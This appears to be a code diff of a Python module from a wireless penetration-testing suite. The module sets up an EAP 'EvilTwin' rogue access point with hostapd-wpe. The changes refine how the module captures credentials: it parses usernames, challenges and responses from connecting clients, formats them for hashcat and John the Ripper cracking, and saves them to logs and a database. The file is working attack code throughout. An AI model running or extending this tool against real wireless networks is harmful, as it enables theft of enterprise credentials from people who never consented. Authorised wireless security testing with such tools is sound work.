@@ -2,7 +2,7 @@
 # Description: Creates an EAP based access point AKA EvilTwin.
 # Author: Nick Sanzotta
 # Contributors: 
-# Version: v 1.08252017
+# Version: v 1.08302017
 
 try:
 	import os, sys, time, datetime, signal, threading
@@ -11,16 +11,15 @@ try:
 except Exception as e:
 	print('\n [!] Error ' +str(e))
 
-
 try:
 	from dbcommands import DB
 	import sqlite3
-	conn = sqlite3.connect('data/WiFiSuite.db', check_same_thread=False) # KEEP Thread Support
-	conn.text_factory = str # KEEP Interpret 8-bit bytestrings 
-	conn.isolation_level = None # KEEP Autocommit Mode
+	conn = sqlite3.connect('data/WiFiSuite.db', check_same_thread=False) # Thread Support
+	conn.text_factory = str # Interpret 8-bit bytestrings 
+	conn.isolation_level = None # Autocommit Mode
 	db = DB(conn)
 except Exception as e:
-	print(red('!') + 'Could not connect to database: ' +str(e))
+	print(red('!')+'Could not connect to database: '+str(e))
 	sys.exit(1)
 
 class evilTwin(threading.Thread):
@@ -46,6 +45,8 @@ class evilTwin(threading.Thread):
 		self.private_key = private_key
 		self.debug = debug
 		self.log_timestamp = '{:%Y-%m-%d_%H:%M:%S}'.format(datetime.datetime.now())
+		self.hashcat_log = 'data/eviltwin/%s_%s.hashcat' % (self.ssid, self.log_timestamp)
+		self.jtr_log = 'data/eviltwin/%s_%s.jtr' % (self.ssid, self.log_timestamp)
 
 
 	def run(self):
@@ -55,13 +56,14 @@ class evilTwin(threading.Thread):
 		self.hostapd_config()
 		self.sanity_check()
 		time.sleep(1.5)
+
 		p1 = Popen(['hostapd-wpe', 'data/hostapd-wpe/hostapd-wpe.conf'], stdout=PIPE)
-		print('\n [i] Real-time logs below:(Press Ctrl-C to quit)\n')
-		hashcat_log = 'data/eviltwin/%s_%s.hashcat' % (self.ssid, self.log_timestamp)
-		# counter = 0
-		# if counter <= 5:
+		if not self.debug:
+			print('\n [i] Real-time logs below:(Press Ctrl-C to quit)\n')
+		else:
+			print('\n'+red('!')+'Warning Debug Mode enabled, credentials will not be saved to the database')
+			print(' [i] Real-time logs below:(Press Ctrl-C to quit)\n')
 		for line in iter(p1.stdout.readline, ''):
-			# counter+=1
 			if not self.debug:
 				if "username" in line:
 					user = line.split()[1]
@@ -71,27 +73,27 @@ class evilTwin(threading.Thread):
 					response = line.split()[1]
 				elif 'jtr' in line:
 					jtr = line.split()[2]
-					hashcat = '%s::::%s:%s\n' % (user, response.translate(None, ':'), challenge.translate(None, ':'))
+					hashcat = '%s::::%s:%s' % (user, response.translate(None, ':'), challenge.translate(None, ':'))
 					print(green('*')+'Identity: %s' % (user))
-					print(green('*')+'Hashcat: %s::::%s:%s' % (user, response.translate(None, ':'), challenge.translate(None, ':')))
+					print(green('*')+'Hashcat: %s' % (hashcat))
 					print(green('*')+'John: %s\n' % (jtr.rjust(5)))
-					with open(hashcat_log, 'a') as f1:
+					with open(self.hashcat_log, 'a') as f1:
 						f1.write(hashcat)
+						f1.write('\n')
+					with open(self.jtr_log, 'a') as f2:
+						f2.write(jtr)
+						f2.write('\n')
 					# Commit to database
 					db.eviltwin_commit(self.ssid, user, hashcat)
 			else:
 				sys.stdout.write(line)
 
-
 		# Obtain hostapd-wpe Process ID
 		global eviltwin_pid
 		eviltwin_pid=p1.pid
 		raw_input(red('!') + 'Press Enter to quit\n\n')
-		# Commit to database
-		# self.captured_creds()
 		# Send the signal terminate HTTPS Serverprocess
 		os.kill(os.getpgid(eviltwin_pid), signal.SIGTERM)
-		# self.driver_fix()
 	
 	def dependency_check(self):
 		'''Checks if hostapd-wpe is installed, if not installs it'''
@@ -127,18 +129,12 @@ class evilTwin(threading.Thread):
 		'''Terminates conflicting processes'''
 		p1 = Popen(['airmon-ng','check','kill'], stdout=PIPE)
 
-	def driver_fix(self):
-		p1 = Popen(['iwpriv', 'wlan0', 'reset', '0'], stdout=PIPE)
-
-
 	def fix_broken_package(self):
 		'''Fixes broken hostapd-wpe packages'''
 		os.system('apt-get purge hostapd-wpe')
 		os.system('apt-get update')
 		os.system('apt-get install hostapd-wpe')
 		#/var/run/hostapd-wpe/wlan0
-		# iwpriv wlan0 reset 0; and if that is not
-		# enough, change 0 to 1
 
 	def hostapd_config(self):
 		'''Creates hostadp-wpe config file based of parameter values'''
@@ -146,10 +142,8 @@ class evilTwin(threading.Thread):
 		with open('/etc/hostapd-wpe/hostapd-wpe.conf', 'r') as f1:
 		    # Read a List of lines into data
 		    data = f1.readlines()
-
 		# Lines to modify in hostapd-wpe config file
 		data[3] = 'interface=%s\n' % (self.wirelessInt)
-		# TESTING DRIVER BUG
 		data[1] = 'driver=nl80211\n'
 		data[14]= 'ssid=%s\n' % (self.ssid)
 		data[15]= 'channel=%s\n' % (self.channel)
@@ -158,14 +152,15 @@ class evilTwin(threading.Thread):
 		data[19] = 'wpe_logfile=data/eviltwin/%s_%s.log\n' % (self.ssid, self.log_timestamp)
 		data[183] = 'hw_mode=%s\n' % (self.band.lower())
 
-
 		print(blue('*')+'EvilTwin Details:')
 		print('     AP Interface: %s' % (self.wirelessInt))
 		print('     SSID: %s' % (self.ssid))
 		print('     Band: %s' % (self.band))
 		print('     Channel: %s' % (self.channel))
 		print('     Certificate Name: %s' % (self.certname))
-		print('     Log saved to: data/eviltwin/%s_%s.log' % (self.ssid, self.log_timestamp))
+		print('     Hashcat Log: %s' % (self.hashcat_log))
+		print('     Jtr Log: %s' % (self.jtr_log))
+		print('     Hostapd Log: data/eviltwin/%s_%s.log' % (self.ssid, self.log_timestamp))
 		# print('     Server Cert Path: %s' % (self.server_cert))
 		# print('     Private Key Path: %s' % (self.private_key))
 		# Design Reference: 
@@ -201,58 +196,3 @@ class evilTwin(threading.Thread):
 		createCert = cert.format(country, state, city, company, orgUnit, fqdn, email)
 		p1 = Popen([createCert],shell=True, stdin=None, stdout=open("/dev/null", "w"), stderr=open("/dev/null", "w"))
 		p1.wait()
-		# for line in iter(p1.stdout.readline, ''):
-		#     sys.stdout.write(line)
-		# print(green('*') + 'TLS/SSL Certificate Successfully Created')
-	
-	def captured_creds(self):
-		ntlm_hash = ''
-		log = 'data/eviltwin/%s_%s.log' % (self.ssid, self.log_timestamp)
-		with open(log) as f1:
-			f1.readline()
-			for line in f1:
-				if "username" in line:
-					user = line.split()[1]
-				elif 'challenge' in line: 
-					challenge = line.split()[1]
-				elif 'response' in line:
-					response = line.split()[1]
-					print('%s, %s, %s' % (user, challenge, response))
-					# Commit to database
-					db.eviltwin_commit(self.ssid, user, ntlm_hash)
-
-
-	def grab_internal_ip(self):
-		print('Place holder')
-
-	def grab_external_ip(self):
-		print('Place holder')
-
-	def certbot_dependency_check(self):
-		p1 = Popen(['which', 'certbot'], stdout=PIPE)
-		if p1.communicate()[0]:
-			p2 = Popen(["certbot", "--version"], stdout=PIPE)
-			print(blue('i')+'Running %s' % (p2.communicate()[0]))
-		else:
-			print(blue('i')+'Installing certbot ...')
-			p3 = Popen(['apt-get install -y certbot'], shell=True, stdin=None, stdout=open("/dev/null", "w"), stderr=None, executable="/bin/bash")
-			p3.wait()
-			print(' [*] Installation completed')
-			os.system('which certbot')
-			os.system('certbot --version')
-			print('\n')
-			# print(p2.communicate())
-
-	def certbot(self):
-		if args == 'certbot':
-			self.dependency_check_certbot()
-			print('run certbot, ignore OpenSSL')
-			print('Ensure Port 80 is forwarded from Internal <IP> to external <IP>')
-			print('Create DNS A record for '+ self.certbot + ' pointing to external <IP>')
-			raw_input('Ready?')
-			p1 = Popen(["certbot certonly --standalone --preferred-challenges http -d" + self.certbot], stdout=PIPE)
-			print('Saving Certs to: data/certs/DOMAIN/')
-			self.server_cert = 'data/certs/DOMAIN'
-			self.private_key = 'data/certs/DOMAIN'
-		else:
-			print('Run OpenSSL')
